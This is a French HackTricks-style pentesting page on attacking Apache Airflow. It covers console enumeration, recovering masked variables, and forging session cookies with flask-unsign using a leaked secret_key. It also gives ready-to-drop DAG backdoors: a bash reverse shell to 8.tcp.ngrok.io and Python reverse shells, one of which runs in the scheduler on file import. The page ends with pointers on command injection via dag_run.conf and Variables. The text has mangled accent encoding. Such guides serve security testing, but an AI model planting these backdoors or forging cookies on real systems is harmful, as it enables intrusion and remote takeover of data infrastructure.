# S√©curit√© Apache Airflow

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

[**Apache Airflow**](https://airflow.apache.org) sert de plateforme pour **orchestrer et planifier des pipelines de donn√©es ou des workflows**. Le terme "orchestration" dans le contexte des pipelines de donn√©es signifie le processus d'organisation, de coordination et de gestion de workflows de donn√©es complexes provenant de diverses sources. L'objectif principal de ces pipelines de donn√©es orchestr√©s est de fournir des ensembles de donn√©es trait√©es et consommables. Ces ensembles de donn√©es sont largement utilis√©s par une myriade d'applications, y compris mais sans s'y limiter, les outils d'intelligence d'affaires, les mod√®les de science des donn√©es et d'apprentissage automatique, qui sont fondamentaux pour le fonctionnement des applications de big data.

En gros, Apache Airflow vous permettra de **planifier l'ex√©cution de code lorsque quelque chose** (√©v√©nement, cron) **se produit**.

## Laboratoire local

### Docker-Compose

Vous pouvez utiliser le **fichier de configuration docker-compose de** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) pour lancer un environnement docker apache airflow complet. (Si vous √™tes sur MacOS, assurez-vous de donner au moins 6 Go de RAM √† la VM docker).

### Minikube

Une mani√®re simple d'**ex√©cuter apache airflow** est de le faire **avec minikube** :
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Configuration d'Airflow

Airflow peut stocker des **informations sensibles** dans sa configuration ou vous pouvez trouver des configurations faibles en place :

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## RBAC Airflow

Avant de commencer √† attaquer Airflow, vous devriez comprendre **comment fonctionnent les permissions** :

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Attaques

### √ânum√©ration de la Console Web

Si vous avez **acc√®s √† la console web**, vous pourriez √™tre capable d'acc√©der √† certaines ou √† toutes les informations suivantes :

* **Variables** (Des informations sensibles personnalis√©es peuvent √™tre stock√©es ici)
* **Connexions** (Des informations sensibles personnalis√©es peuvent √™tre stock√©es ici)
* Acc√©dez-y via `http://<airflow>/connection/list/`
* [**Configuration**](./#airflow-configuration) (Des informations sensibles comme la **`secret_key`** et les mots de passe peuvent √™tre stock√©es ici)
* Liste des **utilisateurs & r√¥les**
* **Code de chaque DAG** (qui peut contenir des informations int√©ressantes)

### R√©cup√©ration des Valeurs des Variables

Les variables peuvent √™tre stock√©es dans Airflow afin que les **DAGs** puissent **acc√©der** √† leurs valeurs. C'est similaire aux secrets d'autres plateformes. Si vous avez **suffisamment de permissions**, vous pouvez y acc√©der dans l'interface graphique via `http://<airflow>/variable/list/`.\
Par d√©faut, Airflow affichera la valeur de la variable dans l'interface graphique, cependant, selon [**ceci**](https://marclamberti.com/blog/variables-with-apache-airflow/), il est possible de d√©finir une **liste de variables** dont la **valeur** appara√Ætra comme des **ast√©risques** dans l'**interface graphique**.

![](<../../.gitbook/assets/image (79).png>)

Cependant, ces **valeurs** peuvent toujours √™tre **r√©cup√©r√©es** via **CLI** (vous devez avoir acc√®s √† la base de donn√©es), **ex√©cution de DAG arbitraire**, **API** en acc√©dant au point de terminaison des variables (l'API doit √™tre activ√©e), et **m√™me l'interface graphique elle-m√™me !**\
Pour acc√©der √† ces valeurs depuis l'interface graphique, il suffit de **s√©lectionner les variables** que vous souhaitez acc√©der et de **cliquer sur Actions -> Exporter**.\
Une autre m√©thode consiste √† effectuer un **bruteforce** sur la **valeur cach√©e** en utilisant le **filtre de recherche** jusqu'√† l'obtenir :

![](<../../.gitbook/assets/image (30).png>)

### √âl√©vation de Privil√®ges

Si la configuration **`expose_config`** est d√©finie sur **True**, √† partir du **r√¥le Utilisateur** et au-del√†, il est possible de **lire** la **configuration dans le web**. Dans cette configuration, la **`secret_key`** appara√Æt, ce qui signifie que tout utilisateur avec cette cl√© valide peut **cr√©er son propre cookie sign√© pour se faire passer pour un autre compte utilisateur**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Porte d√©rob√©e DAG (Ex√©cution de code √† distance dans un worker Airflow)

Si vous avez un **acc√®s en √©criture** √† l'endroit o√π les **DAGs sont sauvegard√©s**, vous pouvez simplement **en cr√©er un** qui vous enverra un **shell invers√©.**\
Notez que ce shell invers√© sera ex√©cut√© √† l'int√©rieur d'un **conteneur de worker airflow** :
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Porte d√©rob√©e DAG (Ex√©cution de code √† distance dans le planificateur Airflow)

Si vous configurez quelque chose pour √™tre **ex√©cut√© √† la racine du code**, au moment de la r√©daction, cela sera **ex√©cut√© par le planificateur** quelques secondes apr√®s l'avoir plac√© dans le dossier des DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Cr√©ation de DAG

Si vous parvenez √† **compromettre une machine √† l'int√©rieur du cluster DAG**, vous pouvez cr√©er de nouveaux **scripts DAG** dans le dossier `dags/` et ils seront **r√©pliqu√©s dans le reste des machines** √† l'int√©rieur du cluster DAG.

### Injection de Code dans DAG

Lorsque vous ex√©cutez un DAG depuis l'interface graphique, vous pouvez **passer des arguments**.\
Par cons√©quent, si le DAG n'est pas correctement cod√©, il pourrait √™tre **vuln√©rable √† l'Injection de Commande.**\
C'est ce qui s'est pass√© dans ce CVE : [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Tout ce que vous devez savoir pour **commencer √† rechercher des injections de commande dans les DAGs** est que les **param√®tres** sont **accessibles** avec le code **`dag_run.conf.get("param_name")`**.

De plus, la m√™me vuln√©rabilit√© peut se produire avec les **variables** (notez qu'avec suffisamment de privil√®ges, vous pourriez **contr√¥ler la valeur des variables** dans l'interface graphique). Les variables sont **accessibles avec** :
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Si elles sont utilis√©es par exemple √† l'int√©rieur d'une commande bash, vous pourriez r√©aliser une injection de commande.

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
